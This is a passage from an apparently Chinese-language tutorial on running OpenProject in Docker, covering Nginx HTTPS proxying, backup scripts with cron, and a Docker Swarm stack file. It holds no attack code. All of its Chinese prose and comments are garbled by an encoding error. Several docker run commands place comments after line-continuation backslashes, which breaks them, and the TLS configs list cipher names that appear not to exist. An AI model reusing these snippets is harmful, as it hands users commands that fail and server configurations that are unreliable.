  --memory-swap=12g \  <span class="hljs-comment"># cgroup v2ç¯å¢ƒä¸­å¯èƒ½æ— æ•ˆï¼Œä»…ä½œå‚è€ƒ</span>
  -e SECRET_KEY_BASE=your-fixed-secret-key-here \  <span class="hljs-comment"># å›ºå®šå€¼ï¼Œç¦æ­¢åŠ¨æ€ç”Ÿæˆ</span>
  -e OPENPROJECT_HOST__NAME=openproject.example.com \
  -e OPENPROJECT_HTTPS=<span class="hljs-literal">true</span> \
  -v /var/openproject/prod/config:/etc/openproject \
  -v /var/openproject/prod/logs:/var/log/openproject \
  -v /var/openproject/prod/assets:/var/openproject/assets \  <span class="hljs-comment"># éå¿…éœ€ï¼Œå¯çœç•¥</span>
  vipxxx.xuanyuan.run/openproject/openproject:17.0.0-slim-bim
</code></pre>
</li>
<li>
<p>åˆ†å¸ƒå¼å­˜å‚¨ï¼ˆCephFS/GlusterFSï¼Œé›†ç¾¤åœºæ™¯å¤‡é€‰ï¼‰ï¼šä»…é€‚åˆé›†ç¾¤éƒ¨ç½²ï¼Œéœ€ä½¿ç”¨<strong>POSIXè¯­ä¹‰å¼ºä¸€è‡´å­˜å‚¨</strong>ï¼ŒNFSåœ¨é«˜å¹¶å‘å†™åœºæ™¯å­˜åœ¨æ•°æ®ä¸ä¸€è‡´é£é™©ï¼ˆæ–‡ä»¶è¦†ç›–ã€ä¸¢å¤±ï¼‰ï¼Œ<strong>ä¸¥ç¦ç”¨äºé«˜å¹¶å‘ç”Ÿäº§é›†ç¾¤</strong>ï¼Œä»…ä½œä¸ºä½å¹¶å‘åœºæ™¯çš„ä¸´æ—¶æ–¹æ¡ˆã€‚</p>
</li>
</ol>
<h3 data-id="heading-20">HTTPSé…ç½®ï¼ˆä¿éšœæ•°æ®ä¼ è¾“å®‰å…¨ï¼Œç”Ÿäº§ç¯å¢ƒå¿…é€‰ï¼Œä»…ä½¿ç”¨slimç‰ˆï¼‰</h3>
<p>OpenProjectç”Ÿäº§ç¯å¢ƒå¿…é¡»å¯ç”¨HTTPSï¼Œé¿å…æ•°æ®æ˜æ–‡ä¼ è¾“ï¼Œæ¨èä½¿ç”¨**åå‘ä»£ç†ï¼ˆNginx/Traefikï¼‰**å¤„ç†SSLç»ˆç»“ï¼ˆç®€åŒ–å®¹å™¨é…ç½®ï¼Œä¾¿äºè¯ä¹¦ç®¡ç†ï¼‰ï¼Œä¹Ÿå¯ç›´æ¥åœ¨å®¹å™¨å†…é…ç½®HTTPSï¼ˆä¸æ¨èï¼‰ã€‚</p>
<h4 data-id="heading-21">æ–¹æ¡ˆ1ï¼šNginxåå‘ä»£ç†ï¼ˆæ¨èï¼Œæ”¯æŒæ ¹åŸŸå/å­ç›®å½•ï¼Œé€‚é…å•èŠ‚ç‚¹/é›†ç¾¤ï¼‰</h4>
<h5 data-id="heading-22">åœºæ™¯1ï¼šæ ¹åŸŸåéƒ¨ç½² <code>https://openproject.example.com</code></h5>
<ol>
<li>
<p>æå‰å‡†å¤‡SSLè¯ä¹¦ï¼ˆå…è´¹è¯ä¹¦å¯é€šè¿‡Let's Encryptè·å–ï¼‰ï¼Œå­˜æ”¾äº<code>/etc/ssl/openproject/</code>ç›®å½•ï¼ˆ<code>cert.pem</code>ä¸ºè¯ä¹¦æ–‡ä»¶ï¼Œ<code>key.pem</code>ä¸ºç§é’¥æ–‡ä»¶ï¼‰ã€‚</p>
</li>
<li>
<p>åˆ›å»ºNginxé…ç½®æ–‡ä»¶<code>/etc/nginx/conf.d/openproject.conf</code>ï¼š</p>
<pre><code class="hljs language-nginx" lang="nginx"># é‡å®šå‘HTTPåˆ°HTTPS
server {
    listen 80;
    server_name openproject.example.com;
    return 301 https://$host$request_uri;
}

# HTTPSæœåŠ¡é…ç½®
server {
    listen 443 ssl;
    server_name openproject.example.com;

    # SSLè¯ä¹¦é…ç½®
    ssl_certificate /etc/ssl/openproject/cert.pem;
    ssl_certificate_key /etc/ssl/openproject/key.pem;
    # SSLä¼˜åŒ–é…ç½®
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers on;
    ssl_session_cache shared:SSL:10m;

    # åå‘ä»£ç†é…ç½®ï¼ˆé€‚é…å•èŠ‚ç‚¹/é›†ç¾¤OpenProject WebæœåŠ¡ï¼‰
    location / {
        proxy_pass http://127.0.0.1:8080;  # å•èŠ‚ç‚¹ï¼šå¯¹åº”å®¹å™¨æ˜ å°„ç«¯å£ï¼›é›†ç¾¤ï¼šå¯¹åº”Traefik/é›†ç¾¤å†…ç½‘åœ°å€
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto https;  # å‘ŠçŸ¥OpenProjectä½¿ç”¨HTTPSåè®®ï¼Œé¿å…é‡å®šå‘å¾ªç¯
    }
}
</code></pre>
</li>
<li>
<p>éªŒè¯Nginxé…ç½®å¹¶é‡å¯æœåŠ¡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">nginx -t  <span class="hljs-comment"># éªŒè¯é…ç½®è¯­æ³•æ­£ç¡®æ€§</span>
systemctl restart nginx
</code></pre>
</li>
</ol>
<h5 data-id="heading-23">åœºæ™¯2ï¼šå­ç›®å½•éƒ¨ç½² <code>https://example.com/openproject</code></h5>
<ol>
<li>
<p>å®¹å™¨å¯åŠ¨æ—¶å·²é…ç½®<code>OPENPROJECT_RAILS__RELATIVE__URL__ROOT=/openproject</code>ï¼Œåˆ›å»ºNginxé…ç½®æ–‡ä»¶<code>/etc/nginx/conf.d/openproject.conf</code>ï¼š</p>
<pre><code class="hljs language-nginx" lang="nginx"># é‡å®šå‘HTTPå­ç›®å½•åˆ°HTTPS
server {
    listen 80;
    server_name example.com;
    location /openproject {
        return 301 https://$host$request_uri;
    }
}

# HTTPSæœåŠ¡é…ç½®
server {
    listen 443 ssl;
    server_name example.com;

    # SSLè¯ä¹¦é…ç½®
    ssl_certificate /etc/ssl/openproject/cert.pem;
    ssl_certificate_key /etc/ssl/openproject/key.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512;
    ssl_prefer_server_ciphers on;
    ssl_session_cache shared:SSL:10m;

    # å­ç›®å½•åå‘ä»£ç†é…ç½®
    location /openproject {
        proxy_pass http://127.0.0.1:8080/openproject;  # ä¸å®¹å™¨å­ç›®å½•é…ç½®ä¿æŒä¸€è‡´
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto https;
        proxy_redirect off;
    }
}
</code></pre>
</li>
<li>
<p>éªŒè¯é…ç½®å¹¶é‡å¯Nginxï¼š</p>
<pre><code class="hljs language-bash" lang="bash">nginx -t
systemctl restart nginx
</code></pre>
</li>
</ol>
<h4 data-id="heading-24">æ–¹æ¡ˆ2ï¼šå®¹å™¨å†…ç›´æ¥é…ç½®HTTPSï¼ˆä¸æ¨èï¼Œè¯ä¹¦ç®¡ç†ç¹çï¼‰</h4>
<p>å¦‚éœ€ç›´æ¥åœ¨å®¹å™¨å†…å¯ç”¨HTTPSï¼Œå¯å°†SSLè¯ä¹¦æŒ‚è½½åˆ°å®¹å™¨å†…ï¼Œå¹¶é…ç½®ç›¸å…³ç¯å¢ƒå˜é‡ï¼ˆä¸æ¨èï¼Œè¯ä¹¦ç®¡ç†ç¹çï¼Œä¸åˆ©äºæ‰¹é‡æ›´æ–°ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
  --name openproject-https \
  --restart=always \
  -p 443:443 \
  -e SECRET_KEY_BASE=your-fixed-secret-key-here \  <span class="hljs-comment"># å›ºå®šå€¼ï¼Œç¦æ­¢åŠ¨æ€ç”Ÿæˆ</span>
  -e OPENPROJECT_HOST__NAME=openproject.example.com \
  -e OPENPROJECT_HTTPS=<span class="hljs-literal">true</span> \
  -e OPENPROJECT_SSL__CERTIFICATE=/etc/ssl/cert.pem \
  -e OPENPROJECT_SSL__KEY=/etc/ssl/key.pem \
  -v /etc/ssl/openproject/cert.pem:/etc/ssl/cert.pem \
  -v /etc/ssl/openproject/key.pem:/etc/ssl/key.pem \
  -v openproject_prod_config:/etc/openproject \
  vipxxx.xuanyuan.run/openproject/openproject:17.0.0-slim-bim
</code></pre>
<h3 data-id="heading-25">å®šæœŸå¤‡ä»½ï¼ˆé˜²æ­¢æ•°æ®ä¸¢å¤±ï¼Œç”Ÿäº§ç¯å¢ƒå¿…é…ï¼Œä»…ä½¿ç”¨slimç‰ˆï¼‰</h3>
<p>é…ç½®å®šæœŸå¤‡ä»½OpenProjectæ•°æ®ï¼Œé¿å…ç¡¬ä»¶æ•…éšœã€è¯¯æ“ä½œå¯¼è‡´æ•°æ®ä¸¢å¤±ï¼Œä»¥ä¸‹æä¾›ä¸¤ç§å¤‡ä»½æ–¹æ¡ˆï¼Œé€‚é…ä¸åŒæŒä¹…åŒ–æ–¹å¼ï¼š</p>
<h4 data-id="heading-26">æ–¹æ¡ˆ1ï¼šå¯¹è±¡å­˜å‚¨+é…ç½®/æ—¥å¿—å¤‡ä»½ï¼ˆé›†ç¾¤ç”Ÿäº§ç¯å¢ƒæ¨èï¼‰</h4>
<p>å¯¹è±¡å­˜å‚¨ï¼ˆS3/MinIOï¼‰è‡ªå¸¦æ•°æ®å†—ä½™ï¼Œåªéœ€å¤‡ä»½OpenProjecté…ç½®æ–‡ä»¶ï¼Œåˆ›å»ºå¤‡ä»½è„šæœ¬<code>/var/backups/openproject/backup_openproject.sh</code>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># OpenProjectï¼ˆå¯¹è±¡å­˜å‚¨ç‰ˆï¼‰å¤‡ä»½è„šæœ¬ï¼ˆé›†ç¾¤ç”Ÿäº§ç¯å¢ƒæ¨èï¼‰</span>
BACKUP_DIR=<span class="hljs-string">"/var/backups/openproject"</span>
TIMESTAMP=$(<span class="hljs-built_in">date</span> +%Y%m%d_%H%M%S)
CONFIG_VOLUME=<span class="hljs-string">"openproject_prod_config"</span>  <span class="hljs-comment"># é…ç½®æ•°æ®å·</span>
LOGS_VOLUME=<span class="hljs-string">"openproject_prod_logs"</span>      <span class="hljs-comment"># æ—¥å¿—æ•°æ®å·ï¼ˆå¯é€‰å¤‡ä»½ï¼‰</span>

<span class="hljs-comment"># åˆ›å»ºå¤‡ä»½ç›®å½•</span>
<span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$BACKUP_DIR</span>

<span class="hljs-comment"># å¤‡ä»½é…ç½®æ•°æ®å·</span>
docker run --<span class="hljs-built_in">rm</span> -v <span class="hljs-variable">$CONFIG_VOLUME</span>:/source -v <span class="hljs-variable">$BACKUP_DIR</span>:/backup alpine \
  tar -czf /backup/<span class="hljs-variable">${CONFIG_VOLUME}</span>_<span class="hljs-variable">${TIMESTAMP}</span>.tar.gz -C /source .
<span class="hljs-built_in">echo</span> <span class="hljs-string">"é…ç½®æ•°æ®å· <span class="hljs-variable">$CONFIG_VOLUME</span> å¤‡ä»½å®Œæˆï¼š<span class="hljs-variable">${BACKUP_DIR}</span>/<span class="hljs-variable">${CONFIG_VOLUME}</span>_<span class="hljs-variable">${TIMESTAMP}</span>.tar.gz"</span>

<span class="hljs-comment"># å¯é€‰ï¼šå¤‡ä»½æ—¥å¿—æ•°æ®å·</span>
docker run --<span class="hljs-built_in">rm</span> -v <span class="hljs-variable">$LOGS_VOLUME</span>:/source -v <span class="hljs-variable">$BACKUP_DIR</span>:/backup alpine \
  tar -czf /backup/<span class="hljs-variable">${LOGS_VOLUME}</span>_<span class="hljs-variable">${TIMESTAMP}</span>.tar.gz -C /source .
<span class="hljs-built_in">echo</span> <span class="hljs-string">"æ—¥å¿—æ•°æ®å· <span class="hljs-variable">$LOGS_VOLUME</span> å¤‡ä»½å®Œæˆï¼š<span class="hljs-variable">${BACKUP_DIR}</span>/<span class="hljs-variable">${LOGS_VOLUME}</span>_<span class="hljs-variable">${TIMESTAMP}</span>.tar.gz"</span>

<span class="hljs-comment"># ä¿ç•™æœ€è¿‘30å¤©å¤‡ä»½ï¼Œåˆ é™¤è¿‡æœŸå¤‡ä»½</span>
find <span class="hljs-variable">$BACKUP_DIR</span> -name <span class="hljs-string">"openproject_prod_*_*.tar.gz"</span> -mtime +30 -delete
<span class="hljs-built_in">echo</span> <span class="hljs-string">"è¿‡æœŸå¤‡ä»½å·²æ¸…ç†ï¼ˆä¿ç•™30å¤©ï¼‰"</span>
</code></pre>
<h4 data-id="heading-27">æ–¹æ¡ˆ2ï¼šæœ¬åœ°ç›®å½•/æ•°æ®å·å¤‡ä»½ï¼ˆå•èŠ‚ç‚¹ç”Ÿäº§ç¯å¢ƒï¼‰</h4>
<p>é€‚é…å•èŠ‚ç‚¹æœ¬åœ°ç›®å½•æˆ–æ•°æ®å·æŒä¹…åŒ–åœºæ™¯ï¼Œåˆ›å»ºå¤‡ä»½è„šæœ¬<code>/var/backups/openproject/backup_openproject.sh</code>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># OpenProjectï¼ˆå•èŠ‚ç‚¹ç‰ˆï¼‰å¤‡ä»½è„šæœ¬</span>
BACKUP_DIR=<span class="hljs-string">"/var/backups/openproject"</span>
SOURCE_DIR=<span class="hljs-string">"/var/openproject/prod"</span>  <span class="hljs-comment"># æœ¬åœ°ç›®å½•è·¯å¾„ï¼ˆæ•°æ®å·å¯é€šè¿‡docker volume inspectè·å–æŒ‚è½½è·¯å¾„ï¼‰</span>
TIMESTAMP=$(<span class="hljs-built_in">date</span> +%Y%m%d_%H%M%S)
CONTAINER_NAME=<span class="hljs-string">"openproject-prod"</span>

<span class="hljs-comment"># åˆ›å»ºå¤‡ä»½ç›®å½•</span>
<span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$BACKUP_DIR</span>

<span class="hljs-comment"># åœæ­¢å®¹å™¨ï¼ˆé¿å…å¤‡ä»½è¿‡ç¨‹ä¸­æ•°æ®å†™å…¥ä¸ä¸€è‡´ï¼Œç¡¬åœä¼šä¸­æ–­ç”¨æˆ·æ“ä½œï¼Œç”Ÿäº§ç¯å¢ƒæ›´æ¨èæ•°æ®åº“å±‚å¤‡ä»½ï¼‰</span>
docker stop <span class="hljs-variable">$CONTAINER_NAME</span>

<span class="hljs-comment"># æ‰“åŒ…å¤‡ä»½æœ¬åœ°ç›®å½•</span>
tar -czf <span class="hljs-variable">$BACKUP_DIR</span>/openproject_prod_<span class="hljs-variable">${TIMESTAMP}</span>.tar.gz -C <span class="hljs-variable">$SOURCE_DIR</span> .

<span class="hljs-comment"># å¯åŠ¨å®¹å™¨</span>
docker start <span class="hljs-variable">$CONTAINER_NAME</span>

<span class="hljs-comment"># ä¿ç•™æœ€è¿‘30å¤©å¤‡ä»½ï¼Œåˆ é™¤è¿‡æœŸå¤‡ä»½</span>
find <span class="hljs-variable">$BACKUP_DIR</span> -name <span class="hljs-string">"openproject_prod_*.tar.gz"</span> -mtime +30 -delete

<span class="hljs-built_in">echo</span> <span class="hljs-string">"å¤‡ä»½å®Œæˆï¼š<span class="hljs-variable">$BACKUP_DIR</span>/openproject_prod_<span class="hljs-variable">${TIMESTAMP}</span>.tar.gz"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"è¿‡æœŸå¤‡ä»½å·²æ¸…ç†ï¼ˆä¿ç•™30å¤©ï¼‰"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"æç¤ºï¼šå®¹å™¨çº§ç¡¬åœå¤‡ä»½ä»…é€‚åˆå°è§„æ¨¡å•æœºï¼Œç”Ÿäº§ç¯å¢ƒä¼˜å…ˆä½¿ç”¨pg_dump/RDSå¿«ç…§ç­‰æ•°æ®åº“å±‚å¤‡ä»½æ–¹æ¡ˆ"</span>
</code></pre>
<h4 data-id="heading-28">é…ç½®å®šæ—¶ä»»åŠ¡ï¼ˆcrontabï¼‰</h4>
<ol>
<li>
<p>ç»™å¤‡ä»½è„šæœ¬æ·»åŠ æ‰§è¡Œæƒé™ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">chmod</span> +x /var/backups/openproject/backup_openproject.sh
</code></pre>
</li>
<li>
<p>ç¼–è¾‘crontabé…ç½®ï¼Œè®¾ç½®æ¯å¤©å‡Œæ™¨2ç‚¹è‡ªåŠ¨æ‰§è¡Œå¤‡ä»½ï¼ˆç”Ÿäº§ç¯å¢ƒä½å³°æœŸï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">crontab -e
</code></pre>
</li>
<li>
<p>æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼ˆä¿å­˜é€€å‡ºï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">0 2 * * * /var/backups/openproject/backup_openproject.sh &gt;&gt; /var/backups/openproject/backup_logs.log 2&gt;&amp;1
</code></pre>
</li>
</ol>
<h3 data-id="heading-29">é›†ç¾¤éƒ¨ç½²ï¼ˆDocker Swarmï¼Œå¤§è§„æ¨¡å›¢é˜Ÿç”Ÿäº§ç¯å¢ƒï¼Œä»…ä½¿ç”¨slimç‰ˆï¼‰</h3>
<p>å¯¹äºéœ€è¦æ”¯æ’‘æ•°åƒç”¨æˆ·è®¿é—®çš„å¤§è§„æ¨¡å›¢é˜Ÿåœºæ™¯ï¼Œå¯ä½¿ç”¨Docker Swarmæ­å»ºé›†ç¾¤ï¼Œå®ç°æœåŠ¡æ°´å¹³æ‰©å±•ã€é«˜å¯ç”¨ä¸è´Ÿè½½å‡è¡¡ï¼Œ<strong>æ ¸å¿ƒè¦æ±‚ï¼šä½¿ç”¨S3/MinIOå¯¹è±¡å­˜å‚¨ã€ç»Ÿä¸€åŠ å¯†å¯†é’¥ã€ä¸“ä¸šåå‘ä»£ç†</strong>ï¼Œä»¥ä¸‹ä¸ºå®Œæ•´æ­£ç¡®é…ç½®ï¼š</p>
<h4 data-id="heading-30">1. åˆå§‹åŒ–Docker Swarmé›†ç¾¤</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åœ¨ç®¡ç†èŠ‚ç‚¹åˆå§‹åŒ–Swarmï¼ˆæ›¿æ¢ä¸ºç®¡ç†èŠ‚ç‚¹å†…ç½‘IPï¼‰</span>
docker swarm init --advertise-addr=10.0.0.100

<span class="hljs-comment"># å¦‚éœ€æ·»åŠ å·¥ä½œèŠ‚ç‚¹ï¼ŒæŒ‰ç…§ç»ˆç«¯è¾“å‡ºçš„å‘½ä»¤åœ¨å·¥ä½œèŠ‚ç‚¹æ‰§è¡Œï¼ˆç¤ºä¾‹ï¼‰</span>
docker swarm <span class="hljs-built_in">join</span> --token SWMTKN-1-xxxxxx 10.0.0.100:2377
</code></pre>
<h4 data-id="heading-31">2. å‡†å¤‡æ ¸å¿ƒèµ„æºï¼ˆDocker Secret+å¯¹è±¡å­˜å‚¨ï¼‰</h4>
<h5 data-id="heading-32">1. åˆ›å»ºç»Ÿä¸€åŠ å¯†å¯†é’¥ï¼ˆè§£å†³Sessionå¤±æ•ˆé—®é¢˜ï¼Œç”Ÿäº§å¿…å¤‡ï¼‰</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç”Ÿæˆé«˜å¼ºåº¦ç»Ÿä¸€åŠ å¯†å¯†é’¥</span>
openssl rand -hex 64 &gt; secret_key_base.txt

<span class="hljs-comment"># åˆ›å»ºDocker Secretï¼Œæ‰€æœ‰å®ä¾‹å…±äº«åŒä¸€å¯†é’¥</span>
docker secret create openproject_secret_key_base secret_key_base.txt

<span class="hljs-comment"># éªŒè¯Secretåˆ›å»ºæˆåŠŸ</span>
docker secret <span class="hljs-built_in">ls</span> | grep openproject_secret_key_base
</code></pre>
<h5 data-id="heading-33">2. é…ç½®S3/MinIOå¯¹è±¡å­˜å‚¨ï¼ˆè§£å†³å¤šå‰¯æœ¬æ•°æ®é”™ä¹±é—®é¢˜ï¼Œé›†ç¾¤å¿…å¤‡ï¼‰</h5>
<p>æå‰æ­å»ºS3æˆ–MinIOå¯¹è±¡å­˜å‚¨æœåŠ¡ï¼Œè·å–è®¿é—®å¯†é’¥ã€å­˜å‚¨æ¡¶åç§°ç­‰ä¿¡æ¯ï¼Œ<strong>ç¡®ä¿æ‰€æœ‰é›†ç¾¤èŠ‚ç‚¹å‡å¯è®¿é—®å¯¹è±¡å­˜å‚¨æœåŠ¡</strong>ï¼Œç¦ç”¨æœ¬åœ°æ–‡ä»¶å­˜å‚¨ã€‚</p>
<h4 data-id="heading-34">3. ç¼–å†™Swarm Stacké…ç½®æ–‡ä»¶ï¼ˆæ ¸å¿ƒä¿®æ­£ï¼Œä½¿ç”¨Traefikåå‘ä»£ç†ï¼‰</h4>
<p>åˆ›å»º<code>openproject-stack.yml</code>ï¼Œç¼–æ’OpenProjectç›¸å…³æœåŠ¡ï¼ˆwebã€dbã€cacheã€traefikåå‘ä»£ç†ï¼‰ï¼Œé‡‡ç”¨Traefikä½œä¸ºä¸“ä¸šåå‘ä»£ç†ï¼Œä¿®æ­£TLSé…ç½®ä¸PostgreSQLå•ç‚¹é£é™©ï¼Œç»™WorkeræœåŠ¡æ·»åŠ èµ„æºé™åˆ¶ï¼Œè¡¥å……Traefikå¿…è¦çš„router/rule/labelsé…ç½®ï¼Œä¿®æ­£depends_onçš„Swarmå±€é™æ€§ï¼Œæ›¿æ¢memcachedä¸ºå›ºå®šç‰ˆæœ¬ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>

<span class="hljs-comment"># å®šä¹‰Docker Secretï¼Œæ‰€æœ‰æœåŠ¡å…±äº«ç»Ÿä¸€åŠ å¯†å¯†é’¥</span>
<span class="hljs-attr">secrets:</span>
  <span class="hljs-attr">openproject_secret_key_base:</span>
    <span class="hljs-attr">external:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># å¼•ç”¨å·²åˆ›å»ºçš„å¤–éƒ¨Secret</span>

<span class="hljs-attr">services:</span>
  <span class="hljs-comment"># 1. æ•°æ®åº“æœåŠ¡ï¼ˆPostgreSQLï¼Œä»…ç”¨äºæ¼”ç¤ºï¼ç”Ÿäº§ç¯å¢ƒå¿…é¡»ä½¿ç”¨ç‹¬ç«‹é«˜å¯ç”¨æ•°æ®åº“ï¼‰</span>
  <span class="hljs-comment"># è­¦å‘Šï¼šè¯¥é…ç½®ä¸ºå•ç‚¹æœ¬åœ°å­˜å‚¨ï¼Œç®¡ç†èŠ‚ç‚¹å®•æœº/è¿ç§»ä¼šå¯¼è‡´æ•°æ®ä¸¢å¤±ï¼Œç”Ÿäº§ç¯å¢ƒè¯·ä½¿ç”¨RDS/Patroni/äº‘æ•°æ®åº“</span>
  <span class="hljs-attr">db:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">postgres:15</span>  <span class="hljs-comment"># ç”Ÿäº§æ¨è14/15ï¼Œé™å®š13â€“16èŒƒå›´</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">/var/openproject/swarm/pgdata:/var/lib/postgresql/data</span>  <span class="hljs-comment"># å»ºè®®ä½¿ç”¨CephFS/GlusterFSæŒä¹…åŒ–ï¼ˆä»…æ¼”ç¤ºï¼‰</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_USER=openproject</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_PASSWORD=openproject_password</span>  <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒå»ºè®®æ›¿æ¢ä¸ºDocker Secret</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_DB=openproject</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">restart_policy:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">on-failure</span>
      <span class="hljs-attr">placement:</span>
        <span class="hljs-attr">constraints:</span> [<span class="hljs-string">node.role</span> <span class="hljs-string">==</span> <span class="hljs-string">manager</span>]  <span class="hljs-comment"># å›ºå®šåˆ°ç®¡ç†èŠ‚ç‚¹ï¼Œé¿å…æ•°æ®è¿ç§»ï¼ˆä»…æ¼”ç¤ºï¼‰</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">openproject_internal</span>
    <span class="hljs-attr">healthcheck:</span>  <span class="hljs-comment"># è¡¥å……å¥åº·æ£€æŸ¥ï¼Œä¸ºä¾èµ–æœåŠ¡æä¾›å°±ç»ªåˆ¤æ–­</span>
      <span class="hljs-attr">test:</span> [<span class="hljs-string">"CMD-SHELL"</span>, <span class="hljs-string">"pg_isready -U openproject"</span>]
      <span class="hljs-attr">interval:</span> <span class="hljs-string">10s</span>
      <span class="hljs-attr">timeout:</span> <span class="hljs-string">5s</span>
      <span class="hljs-attr">retries:</span> <span class="hljs-number">5</span>

  <span class="hljs-comment"># 2. ç¼“å­˜æœåŠ¡ï¼ˆMemcachedï¼Œå•å‰¯æœ¬ï¼Œä½¿ç”¨å›ºå®šç‰ˆæœ¬é¿å…è¡Œä¸ºå˜æ›´ï¼‰</span>
  <span class="hljs-attr">cache:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">memcached:1.6-alpine</span>  <span class="hljs-comment"># æ›¿æ¢latestä¸ºå›ºå®šç¨³å®šç‰ˆæœ¬ï¼Œé¿å…ç”Ÿäº§äº‹æ•…</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">restart_policy:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">on-failure</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">openproject_internal</span>
    <span class="hljs-attr">healthcheck:</span>  <span class="hljs-comment"># è¡¥å……å¥åº·æ£€æŸ¥</span>
      <span class="hljs-attr">test:</span> [<span class="hljs-string">"CMD"</span>, <span class="hljs-string">"memcached-tool"</span>, <span class="hljs-string">"localhost:11211"</span>, <span class="hljs-string">"stats"</span>]
      <span class="hljs-attr">interval:</span> <span class="hljs-string">10s</span>
      <span class="hljs-attr">timeout:</span> <span class="hljs-string">5s</span>
      <span class="hljs-attr">retries:</span> <span class="hljs-number">3</span>

  <span class="hljs-comment"># 3. OpenProject WebæœåŠ¡ï¼ˆåº”ç”¨å±‚ï¼Œæ°´å¹³æ‰©å±•ï¼Œä»…slimç‰ˆï¼‰</span>
  <span class="hljs-comment"># æ³¨æ„ï¼šå¿…é¡»é…åˆS3/MinIOå¯¹è±¡å­˜å‚¨ï¼Œå¦åˆ™é™„ä»¶/å¯¼å‡ºæ–‡ä»¶ä¼šå‡ºç°ä¸¢å¤±/é”™ä¹±ï¼Œæœªå¯ç”¨å¯¹è±¡å­˜å‚¨è¯·ä¿æŒreplicas=1</span>
  <span class="hljs-attr">web:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">vipxxx.xuanyuan.run/openproject/openproject:17.0.0-slim-bim</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-comment"># ä»Docker Secretè¯»å–ç»Ÿä¸€åŠ å¯†å¯†é’¥ï¼Œé¿å…Sessionå¤±æ•ˆ</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">SECRET_KEY_BASE_FILE=/run/secrets/openproject_secret_key_base</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">OPENPROJECT_HOST__NAME=openproject.example.com</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">OPENPROJECT_HTTPS=true</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DATABASE_URL=postgresql://openproject:openproject_password@db:5432/openproject</span>  <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒå»ºè®®æ›¿æ¢ä¸ºDocker Secret</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">MEMCACHE_SERVER=cache:11211</span>
      <span class="hljs-comment"># å¯¹è±¡å­˜å‚¨é…ç½®ï¼ˆé›†ç¾¤å¿…å¤‡ï¼Œè§£å†³å¤šå‰¯æœ¬æ•°æ®é”™ä¹±ï¼‰</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">OPENPROJECT_ATTACHMENTS__STORAGE="fog"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">OPENPROJECT_FOG_DIRECTORY="openproject-attachments"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">OPENPROJECT_FOG_CREDENTIALS_PROVIDER="AWS"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">OPENPROJECT_FOG_CREDENTIALS_AWS__ACCESS__KEY__ID="your-access-key"</span>  <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒå»ºè®®æ›¿æ¢ä¸ºDocker Secret</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">OPENPROJECT_FOG_CREDENTIALS_AWS__SECRET__ACCESS__KEY="your-secret-key"</span>  <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒå»ºè®®æ›¿æ¢ä¸ºDocker Secret</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">OPENPROJECT_FOG_CREDENTIALS_REGION="cn-north-1"</span>
